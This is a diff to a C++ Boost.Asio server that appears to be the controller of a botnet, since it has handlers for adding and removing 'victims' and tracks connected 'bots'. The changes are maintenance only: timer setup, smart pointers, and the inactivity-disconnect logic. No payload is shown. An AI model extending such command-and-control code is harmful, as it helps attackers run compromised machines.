@@ -1,5 +1,7 @@
 #include "server.h"
 
+#include <memory>
+
 #ifdef NDEBUG
 #define PRINT(a, b)
 #else
@@ -11,8 +13,6 @@ server::server(io::io_context& io_context, std::uint16_t port)
       acceptor_(io_context, tcp::endpoint(tcp::v4(), port)),
       interval_(INACTIVITY_TIMEOUT),
       timer_(io_context_, interval_) {
-	timer_.async_wait(boost::bind(&server::pingClients, this));
-
 	command_handlers_ = {
 	    {"[ARE_YOU_ALIVE]",
 	     boost::bind(&server::handleAlive, this, boost::placeholders::_1, boost::placeholders::_2, boost::placeholders::_3)},
@@ -35,6 +35,7 @@ void server::start() {
 	// routine_future_ = std::async(std::launch::async, &server::pingClients,
 	// 			     this);  // TODO: substitude this by boost::asio internal timeout clock
 
+	timer_.async_wait(boost::bind(&server::pingClients, this));
 	accept();
 }
 
@@ -46,7 +47,7 @@ void server::accept() {
 void server::onAccept(err error_code) {
 	size_t client_id = getClientId_();
 	clients_sessions_container_.insert(
-	    std::make_pair(client_id, std::make_shared<session>(std::move(*socket_), io_context_, client_id)));
+	    std::make_pair(client_id, std::unique_ptr<session>(new session(std::move(*socket_), io_context_, client_id))));
 	auto& client = clients_sessions_container_.find(client_id)->second;
 
 	PRINT("New client connected", "");
@@ -130,27 +131,27 @@ void server::addVictim(std::string& command, std::vector<std::string>& params, s
 }
 
 void server::removeClient(std::string& command, std::vector<std::string>& params, session* client) {
-	if (params.size() < 2) return;
-	if (!checkHash_(params[0])) return;
-	std::shared_ptr<session> bot;
-	size_t bot_id;
-	{
-		std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
-		for (auto const& [key, val] : clients_sessions_container_) {
-			std::stringstream ip;
-			ip << val->endpoint_;
-			if (params[1] == ip.str()) {
-				bot_id = key;
-				bot = val;
-				break;
-			}
-		}
-	}
-	bot->stop();
-	{
-		std::unique_lock<std::mutex> lock(clients_m_);
-		clients_sessions_container_.erase(bot_id);
-	}
+	// if (params.size() < 2) return;
+	// if (!checkHash_(params[0])) return;
+	// std::unique_ptr<session> bot;
+	// size_t bot_id;
+	// {
+	// 	std::unique_lock<std::mutex> lock(clients_m_);	// TODO: create second hash map with ip addresses
+	// 	for (auto const& [key, val] : clients_sessions_container_) {
+	// 		std::stringstream ip;
+	// 		ip << val->endpoint_;
+	// 		if (params[1] == ip.str()) {
+	// 			bot_id = key;
+	// 			bot = val;
+	// 			break;
+	// 		}
+	// 	}
+	// }
+	// bot->stop();
+	// {
+	// 	std::unique_lock<std::mutex> lock(clients_m_);
+	// 	clients_sessions_container_.erase(bot_id);
+	// }
 }
 
 void server::removeVictim(std::string& command, std::vector<std::string>& params, session* client) {
@@ -165,24 +166,23 @@ void server::removeVictim(std::string& command, std::vector<std::string>& params
 
 void server::pingClients() {
 	std::vector<size_t> inactive_clients;
-
 	for (auto& client : clients_sessions_container_) {
 		client.second->inactive_timeout_count_++;
 
-		if (client.second->inactive_timeout_count_ >= 3) {
-			client.second->send("Disconecting due to inactivity\n");
+		if (client.second->inactive_timeout_count_ >= 10) {
 			std::cout << "Disconecting " << client.second->endpoint_ << " due to inactivity" << std::endl;
 
 			inactive_clients.push_back(client.second->id_);
-			client.second->stop();
 		} else {
 			client.second->send(":msg [ARE_YOU_ALIVE]\n");
 		}
 	}
 	{
-		std::unique_lock<std::mutex> lock(clients_m_);
-		for (auto& client_id : inactive_clients) {
-			clients_sessions_container_.erase(client_id);
+		if (inactive_clients.size()) {
+			std::unique_lock<std::mutex> lock(clients_m_);
+			for (auto& client_id : inactive_clients) {
+				clients_sessions_container_.erase(client_id);
+			}
 		}
 	}
 	timer_.expires_at(timer_.expires_at() + interval_);
